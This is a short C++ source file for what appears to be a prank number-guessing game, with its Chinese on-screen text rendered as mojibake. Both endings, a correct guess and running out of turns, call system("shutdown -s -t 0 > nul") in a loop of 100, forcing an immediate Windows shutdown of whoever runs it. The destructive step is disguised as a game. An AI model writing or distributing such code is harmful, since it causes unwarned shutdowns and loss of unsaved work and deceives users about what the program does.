#include<cstdio>
#include<cstdlib>
#include<ctime>
int main() {
	system("title 'A JieCaoless Game'");
	srand(time(0));
	int n;
	n = rand() * rand() % 10000;
	int m;
	m = rand() * rand() % 10000 + n;
	int T, Tb;
	T = rand() * rand() % 100 + 1;
	Tb = T;
	printf("�������Ϸ�ɣ�\n���� %d ����������һ�� 0 - %d ������\n", T, m);
	while(T-- > 0) {
		int random = rand() % 10 + 1;
		if((Tb - T) % random == 0)
			printf("����� %d �λ��ᣨ��������������ַ�����", Tb - T);
		else
			printf("����� %d �λ��᣺", Tb - T);
		int a;
		scanf("%d", &a);
		if(a == n) {
			printf("��ϲ�㣡�¶��ˣ����ǡ�������ĵ��Ի��ǵùػ���\n");
			for(int i = 1; i <= 100; i++)
				system("shutdown -s -t 0 > nul");
			return 0;
		}
		else
			printf("��´��ˣ�\n");
	}
	printf("�Բ��𣬻��������ˣ����ߵ������� gold mountain king\n�ݰݣ�\n");
	for(int i = 1; i <= 100; i++)
		system("shutdown -s -t 0 > nul");
}
